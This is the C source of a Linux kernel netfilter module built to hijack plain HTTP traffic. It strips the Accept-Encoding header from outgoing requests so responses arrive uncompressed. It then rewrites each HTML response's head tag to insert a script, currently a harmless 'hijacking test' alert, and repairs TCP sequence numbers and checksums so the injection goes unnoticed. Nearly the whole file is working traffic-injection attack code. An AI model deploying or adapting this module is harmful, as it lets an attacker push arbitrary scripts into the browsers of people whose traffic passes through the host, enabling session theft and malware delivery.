#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/if_packet.h>
#include <linux/socket.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_nat.h>
#include <net/netfilter/nf_nat_core.h>
#include <net/netfilter/nf_nat_helper.h>

char shellcode[] = "<head><script>alert('hijacking test!')</script>";

typedef struct Pseudo_Header {
	unsigned int saddr;
	unsigned int daddr;
	unsigned char res;
	unsigned char proto;
	unsigned short len;
}pse_hd;

unsigned short checksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;

	uint16_t * w = addr;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof(uint16_t);
	}

	if (nleft == 1) {
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcph)
{
	unsigned short tcp_len;
	unsigned short ret = 0;
	unsigned short ip_len = 0;
	char *buf = NULL;
	ip_len = (ip_hd->ihl & 0x0f) * 4;
	tcp_len = ntohs(ip_hd->tot_len) - ((ip_hd->ihl & 0x0f) * 4);
	buf = kmalloc(tcp_len + sizeof(pse_hd), GFP_KERNEL);
	if(buf == NULL)
	{
		printk(KERN_ALERT "hook_ipv4: Error in malloc mem\n");
		return 0;
	}

	pse_hd *phd = (pse_hd *)buf;
	phd->saddr = ip_hd->saddr;
	phd->daddr = ip_hd->daddr;
	phd->res = 0;
	phd->proto = IPPROTO_TCP;
	phd->len = htons(tcp_len);
	memcpy(buf+sizeof(pse_hd),tcph,tcp_len);
	tcph = (struct tcphdr *)(buf+sizeof(pse_hd));
	tcph->check = 0;
	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
	kfree(buf);
	return ret; 
}

// int delete_padding(char *buf)
// {
// 	char *pl = NULL;
// 	char *pr = NULL;
	
// 	pl = strstr(buf,"<");
// 	pr = strstr(buf,">");
// 	if(pl != NULL && pr != NULL)
// 	{
// 		if((long long)pl - (long long)pr > 0)
// 		{
// 			memset(buf,' ',(long long)pl - (long long)buf);
// 		}
// 	}
// }

// int check_insert(char *pkg)
// {
// 	int max_size = 0;
// 	int len = 0;
// 	char *phtml = NULL;
// 	char *pbody = NULL;
// 	char *ptemp = NULL;
	
// 	if(strstr(pkg,"<html") != NULL){
// 		phtml = strstr(pkg,"<html");
// 		phtml += 5;
// 	}else if(strstr(pkg,"<!DOCTYPE html") != NULL){
// 		phtml = strstr(pkg,"<!DOCTYPE html");
// 		phtml += 14;
// 	}else{
// 		return 0;
// 	}

// 	printk(KERN_ALERT "hook_ipv4: HTML tag found\n");
		
// 	phtml[0] = '>';
// 	memcpy(phtml + 1,shellcode,strlen(shellcode));
// 	delete_padding(phtml + 1 + strlen(shellcode));
	
// 	return 1;
// }

int delete_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	printk(KERN_ALERT "hook_ipv4: Delete Coding: %d\n",len);
	
	memset(pK - 2,' ',len + 2);
	return 1;
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);
	unsigned short iph_len = ip_hdrlen(skb);
	unsigned short tol_len = ntohs(iph->tot_len);

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);

		if (0 != skb_linearize(skb)) {
            return NF_ACCEPT;
        }
		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		char *pkg = (char *)skb->data + 40;

		if (src_port == 80)
		{
			if (memcmp(pkg,"HTTP/1.1",8) != 0)
			{
				return NF_ACCEPT;
			}
			//memcpy(pkg,hack_str,strlen(hack_str));
			// if(check_insert(pkg))
			// {
			// 	printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
			// 	printk(KERN_ALERT "hook_ipv4: Insert success\n");
			// }

			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}
			printk(KERN_ALERT "hook_ipv4: Found Head tag\n");
			// sudo iptables -t nat --list
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,
                                        phead - pkg, 6,
                                        shellcode, strlen(shellcode))) 
			{
                skb->local_df = 1;
            	skb_shinfo(skb)->gso_size = 0;
                printk("insert success\n");
            }
		}
		else if (dest_port == 80)
		{
			if (memcmp(pkg,"GET / HTTP/1.1",strlen("GET / HTTP/1.1")) != 0)
			{
				return NF_ACCEPT;
			}
			
			delete_encoding(pkg);
		}
		// unsigned short cs = checksum_tcp(iph, tcph);
		// tcph->check = cs;
		struct rtable *rt = skb_rtable(skb);
		//计算校验和，参考内核源码 的net/ipv4/tcp_ipv4.c tcp_v4_send_check函数
        //和net/ipv4/netfilter/nf_nat_helper.c nf_nat_mangle_tcp_packet 函数
                        //和net/netfilter/xt_TCPMSS.c 的 tcpmss_mangle_packet 函数
        int datalen = skb->len - iph->ihl * 4;
        int oldlen = datalen - 9;
        if (skb->ip_summed != CHECKSUM_PARTIAL) {
            if (!(rt->rt_flags & RTCF_LOCAL) && skb->dev->features
                    & NETIF_F_V4_CSUM) {
                skb->ip_summed = CHECKSUM_PARTIAL;
                skb->csum_start = skb_headroom(skb)
                        + skb_network_offset(skb) + iph->ihl * 4;
                skb->csum_offset = offsetof(struct tcphdr, check);
                tcph->check = ~tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, 0);
            } else {
                tcph->check = 0;
                tcph->check = tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, csum_partial(tcph, datalen, 0));
            }
        } else
            inet_proto_csum_replace2(&tcph->check, skb, htons(oldlen),
                    htons(datalen), 1);
	}
	return NF_ACCEPT;
}

/* Adjust one found SACK option including checksum correction */
static void
sack_adjust(struct sk_buff *skb,
	    struct tcphdr *tcph,
	    unsigned int sackoff,
	    unsigned int sackend,
	    struct nf_nat_seq *natseq)
{
	while (sackoff < sackend) {
		struct tcp_sack_block_wire *sack;
		__be32 new_start_seq, new_end_seq;

		sack = (void *)skb->data + sackoff;
		if (after(ntohl(sack->start_seq) - natseq->offset_before,
			  natseq->correction_pos))
			new_start_seq = htonl(ntohl(sack->start_seq)
					- natseq->offset_after);
		else
			new_start_seq = htonl(ntohl(sack->start_seq)
					- natseq->offset_before);

		if (after(ntohl(sack->end_seq) - natseq->offset_before,
			  natseq->correction_pos))
			new_end_seq = htonl(ntohl(sack->end_seq)
				      - natseq->offset_after);
		else
			new_end_seq = htonl(ntohl(sack->end_seq)
				      - natseq->offset_before);

		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
			 ntohl(sack->start_seq), new_start_seq,
			 ntohl(sack->end_seq), new_end_seq);

		inet_proto_csum_replace4(&tcph->check, skb,
					 sack->start_seq, new_start_seq, 0);
		inet_proto_csum_replace4(&tcph->check, skb,
					 sack->end_seq, new_end_seq, 0);
		sack->start_seq = new_start_seq;
		sack->end_seq = new_end_seq;
		sackoff += sizeof(*sack);
	}
}

/* TCP SACK sequence number adjustment */
static inline unsigned int
nf_nat_sack_adjust(struct sk_buff *skb,
		   struct tcphdr *tcph,
		   struct nf_conn *ct,
		   enum ip_conntrack_info ctinfo)
{
	unsigned int dir, optoff, optend;
	struct nf_conn_nat *nat = nfct_nat(ct);

	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
	optend = ip_hdrlen(skb) + tcph->doff * 4;

	if (!skb_make_writable(skb, optend))
		return 0;

	dir = CTINFO2DIR(ctinfo);

	while (optoff < optend) {
		/* Usually: option, length. */
		unsigned char *op = skb->data + optoff;

		switch (op[0]) {
		case TCPOPT_EOL:
			return 1;
		case TCPOPT_NOP:
			optoff++;
			continue;
		default:
			/* no partial options */
			if (optoff + 1 == optend ||
			    optoff + op[1] > optend ||
			    op[1] < 2)
				return 0;
			if (op[0] == TCPOPT_SACK &&
			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0)
				sack_adjust(skb, tcph, optoff+2,
					    optoff+op[1], &nat->seq[!dir]);
			optoff += op[1];
		}
	}
	return 1;
}

/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
int
nf_nat_seq_adjust(struct sk_buff *skb,
		  struct nf_conn *ct,
		  enum ip_conntrack_info ctinfo)
{
	struct tcphdr *tcph;
	int dir;
	__be32 newseq, newack;
	s16 seqoff, ackoff;
	struct nf_conn_nat *nat = nfct_nat(ct);
	struct nf_nat_seq *this_way, *other_way;

	dir = CTINFO2DIR(ctinfo);

	this_way = &nat->seq[dir];
	other_way = &nat->seq[!dir];

	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
		return 0;

	tcph = (void *)skb->data + ip_hdrlen(skb);
	if (after(ntohl(tcph->seq), this_way->correction_pos))
		seqoff = this_way->offset_after;
	else
		seqoff = this_way->offset_before;

	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
		  other_way->correction_pos))
		ackoff = other_way->offset_after;
	else
		ackoff = other_way->offset_before;

	newseq = htonl(ntohl(tcph->seq) + seqoff);
	newack = htonl(ntohl(tcph->ack_seq) - ackoff);

	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);

	printk(KERN_ALERT "Adjusting sequence number from %u->%u, ack from %u->%u\n",
		 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
		 ntohl(newack));

	tcph->seq = newseq;
	tcph->ack_seq = newack;

	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
}

unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
        const struct net_device *in, const struct net_device *out, int(*okfn)(
                struct sk_buff *))
{
    enum ip_conntrack_info ctinfo;

    //Note that the connection tracking subsystem
    //is invoked after the raw table has been processed, but before the mangle table.
    //所以下面 要指定.priority = NF_IP_PRI_MANGLE  nf_ct_get 才会返回有效的值
    struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
    
    if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status)
            && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
        nf_nat_seq_adjust(skb, ct, ctinfo);
    	// printk(KERN_ALERT "nf_nat_seq_adjust\n");
    }

    return NF_ACCEPT;
  
}

static struct nf_hook_ops http_hooks = 
{ 
	.pf = NFPROTO_IPV4,
    .priority = NF_IP_PRI_MANGLE, 
    .hooknum = NF_INET_POST_ROUTING, 
    .hook = hook_func,
};

static struct nf_hook_ops seq_adjust[] = {
    {
	    .hook           = fix_seq,
	    .pf             = PF_INET,
	    .hooknum        = NF_INET_LOCAL_IN,
    	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
    },
    {
        .hook           = fix_seq,
        .pf             = PF_INET,
        .hooknum        = NF_INET_POST_ROUTING,
        .priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
    },
};

int init_module(void)
{
	nf_register_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
	nf_register_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_module(void)
{
	nf_unregister_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
	nf_unregister_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}
